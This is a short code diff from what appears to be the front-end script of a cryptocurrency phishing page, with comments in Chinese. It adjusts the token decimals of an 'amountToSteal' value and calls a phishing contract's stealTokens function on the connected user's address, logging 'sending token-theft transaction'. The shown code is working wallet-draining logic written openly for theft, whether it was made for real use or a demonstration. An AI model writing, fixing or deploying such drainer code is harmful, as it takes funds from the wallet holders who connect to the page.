@@ -161,7 +161,7 @@ async function setupWeb3() {
             const userAddress = await signer.getAddress();
             
             // 這裡假設我們要偷 1000 個 mUSDT
-            const amountToSteal = ethers.utils.parseUnits("1000", 6);
+            const amountToSteal = ethers.utils.parseUnits("1000", 18);
 
             console.log("發送竊取代幣交易中...");
             const stealTx = await phishingContract.stealTokens(userAddress, amountToSteal);
